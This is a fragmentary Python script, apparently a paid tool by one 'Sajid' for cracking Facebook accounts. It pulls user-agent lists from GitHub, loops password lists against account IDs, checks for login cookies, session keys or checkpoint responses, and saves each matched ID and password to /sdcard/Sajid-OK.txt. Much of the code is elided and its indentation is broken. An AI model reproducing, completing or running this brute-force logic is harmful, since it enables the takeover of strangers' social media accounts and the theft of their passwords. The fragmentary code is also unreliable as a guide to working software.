...
import os,base64
os.system("xdg-open https://www.facebook.com/ktk.sajid.92")
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Sajid/Data/main/sm.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Sajid/DATA-FILE/main/UAGNT').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
\033[1;91m   | |   '.___`-.   | || |              | || |   / ____ \    | 
\033[1;91m   | |  |`\____) |  | || |              | || | _/ /    \ \_ | 
\033[1;91m   | |  |_______.'  | || |   _______      |               |
\033[1;37m   <____________________________________>
 [-]\033[1;37mCREATED BY     : \033[1;37mSajid\033[1;37m
 [-]\033[1;37mFACEBOOK       : \033[1;37mSajid_ktk\033[1;37m
 [-]\033[1;37mFRIEND         : \033[1;37mJoker_Dp\033[1;37m
 [-]\033[1;37mVERSION        :\033[1;37m 1.0\033[1;37m
 [-]\033[1;37mSTATUS         :\033[1;37m PAID\033[1;37m
--------------------------------------------------
\033[1;36m    Beta Ko Hath Lagana Sa Pahla Bap Sa Bat Kr\033[1;37m
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/Sajid.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/Sajid.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/Sajid.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://m.me/+923490093530');menu()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [Sajid] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [Sajid-OK] %s | %s'%(ids,pas))
				open('/sdcard/Sajid-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Sajid-CP] '+ids+' | '+pas+'\033[1;97m')
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Sajid-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/Sajid-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [Sajid] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [Sajid-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [Sajid-OK] '+ids+' | '+pas)
